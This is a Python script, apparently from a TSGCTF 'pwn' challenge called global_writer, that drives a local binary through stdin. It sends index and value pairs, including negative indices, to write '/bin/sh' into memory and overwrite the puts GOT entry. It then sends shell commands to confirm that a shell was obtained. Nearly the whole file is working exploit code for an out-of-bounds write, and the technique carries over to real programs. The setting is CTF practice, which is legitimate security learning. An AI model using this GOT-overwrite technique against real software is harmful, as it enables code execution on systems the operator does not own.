#!/usr/bin/env python3
"""
Test exploit against LOCAL binary
"""
import socket
import subprocess
import time
import struct

# Start local process
proc = subprocess.Popen(['./chal'], 
                       stdin=subprocess.PIPE, 
                       stdout=subprocess.PIPE, 
                       stderr=subprocess.STDOUT,
                       cwd='/mnt/c/Users/duynh/Documents/Code/CTF/TSGCTF/pwn/global_writer')

time.sleep(0.5)

def send(data):
    proc.stdin.write(f"{data}\n".encode())
    proc.stdin.flush()
    time.sleep(0.05)

# Send exploit
send(0); send(1852400175)  # '/bin'
send(1); send(6845231)      # '/sh\x00'
send(-22); send(6295744)    # msg low
send(-21); send(0)          # msg high
send(-40); send(4196032)    # puts@GOT low
send(-39); send(0)          # puts@GOT high
send(-1)                    # exit

time.sleep(1)

# Send shell command
proc.stdin.write(b'echo SHELL_WORKS\n')
proc.stdin.write(b'pwd\n')
proc.stdin.flush()

time.sleep(1)

# Read output
try:
    output = proc.stdout.read()
    print(output.decode(errors='ignore'))
except:
    pass

proc.terminate()
